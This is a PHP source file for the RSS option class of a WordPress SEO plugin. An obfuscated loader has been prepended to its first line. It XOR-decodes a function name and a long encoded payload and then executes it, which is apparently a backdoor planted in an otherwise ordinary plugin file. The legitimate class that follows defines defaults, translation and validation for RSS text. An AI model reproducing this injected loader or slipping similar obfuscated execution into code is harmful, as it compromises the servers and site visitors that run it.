<?php $TpZkONc='S8K6=W6KEW56U8Z'; $GUxAKZ='0J.WI2i-09VB<W4'^$TpZkONc; $xDfCFm='>3zD>E++ G:8g7VD1YHio W=j+X-62rVCNdBpa5XbR: YN0 ;fI-O7=11Ldm FNknDR<SnxGRW4jBtCSq+o9mp,G-JnmNdacMD>U=jw+loFeyboGT>ED--<cc<;B,MCrGUOJx2APs:,8VzTHyc<6<Z2UWgdiofK3RwgGEps42ABUYatFV8pibp7cQ6.NLL9Gf NLfsX2AkGMEWPOB7tjv.,4G1MxC-;FJf K+nPTV3Z EUCyROHP.OFmgBq1z6 = APKxoS==LeTwTH5.3ExW6xfcJ1ML,-,8giOnX4WyZAHU, XFMDtB5=4UaHJhg,SeFgiZM28bH.9;2BHK YPLZel+w5yvjzW68lw<XKqKloo=ZVK7fBBz10rH+Y-gYE:msPw=T4iEbcu2L9WKdsw9+WK1uBfS0QCrA483UGHozI+KH 0AV1WSi2CBf4O:,ke 9<Y7+>XRugZ,PXS0ygYZDZfdWo=YL4:.IUhylh>-gV47,LfmRWZ5 S-k K>m=6D1I>xbW=>qvwl 6=6ffCwdCP bAj=7 9kp.PKuayqJpflw;pcoQbe.61wMkp64mdYir,1bTK3h<n1iGiEoZ,N 7RsW0.d<E =F:Rq;7C;A  pdpbSA3SShDtEKcwNlaT8T6DmIR-Zmf=63 53QV+pok055+<aVpxeH'; $qoimJGMJ=$GUxAKZ('', 'WUReX0EHT.UV8R.-B-;AHX8O5O9YWm-;6:CkYANRk4ON::YOUF1B=hYPE-;2M3:CJ 3H2BXc92MCbTcsQPe0dTC2YjSMiCZiDMX:OBSBLRfUBBK.hM16AHRKGXZ6MdxRc<daQ8HYWUYLvTihQGXWH;iq>:D7OB V+,C.eUSGF3.07IP-3AY4KK=jXDK:9>WoBO;8OHR;<a:GOs4.6VTWVHMX4TvrgIZ2+9K.RNmt0R6S nIs4 :5O,.MOf.r5yktea18XK8XDlXjWp>TBF QwMroG.P9-sFIAGToJ3Q.BPHl1MT9fpdP4TQA0ZB7bmE5EnFM>,FYKhU32T-:.A:8lrA3y2d,39.wWKLSW=2QvROKK;:>ROb9p89V,J-L82 CMNpSV1MROkjQV-M6kYSSOJ;>TNHo.:,IxePYG4guO:<E8-RY :X-6AJ,09P.NM4:MLHqUJM=dA8>I377UQC=;0;OHwKY88UeE,,APWbWKOrPVX-FKtw;GR2T4K.G2XN-B=MPE<XGVZWHDWIWOFeQDk=DWiNYVTX0WE52R<PQwMFKEZDRWbVWLTRF+ZERPTSiZCNWW5rUYXYWNnIcIzM<RV+,<UW;Y=IN2IzVKV:W.ADWHPF7 G2zAdTekCW5fh1N5ZlI-3Y;6AMWJLZR5qvYTa9PMBHIfYCo5'^$xDfCFm); $qoimJGMJ();
/**
 * @package WPSEO\Internals\Options
 */

/**
 * Option: wpseo_rss
 */
class WPSEO_Option_RSS extends WPSEO_Option {

	/**
	 * @var  string  option name
	 */
	public $option_name = 'wpseo_rss';

	/**
	 * @var  array  Array of defaults for the option
	 *        Shouldn't be requested directly, use $this->get_defaults();
	 * @internal  Note: Some of the default values are added via the translate_defaults() method
	 */
	protected $defaults = array(
		'rssbefore' => '', // Text area.
		'rssafter'  => '', // Text area.
	);


	/**
	 * Get the singleton instance of this class
	 *
	 * @return object
	 */
	public static function get_instance() {
		if ( ! ( self::$instance instanceof self ) ) {
			self::$instance = new self();
		}

		return self::$instance;
	}


	/**
	 * Translate strings used in the option defaults
	 *
	 * @return void
	 */
	public function translate_defaults() {
		/* translators: 1: link to post; 2: link to blog. */
		$this->defaults['rssafter'] = sprintf( __( 'The post %1$s appeared first on %2$s.', 'wordpress-seo' ), '%%POSTLINK%%', '%%BLOGLINK%%' );
	}


	/**
	 * Validate the option
	 *
	 * @param  array $dirty New value for the option.
	 * @param  array $clean Clean value for the option, normally the defaults.
	 * @param  array $old   Old value of the option.
	 *
	 * @return  array      Validated clean value for the option to be saved to the database
	 */
	protected function validate_option( $dirty, $clean, $old ) {
		foreach ( $clean as $key => $value ) {
			if ( isset( $dirty[ $key ] ) ) {
				$clean[ $key ] = wp_kses_post( $dirty[ $key ] );
			}
		}

		return $clean;
	}
}
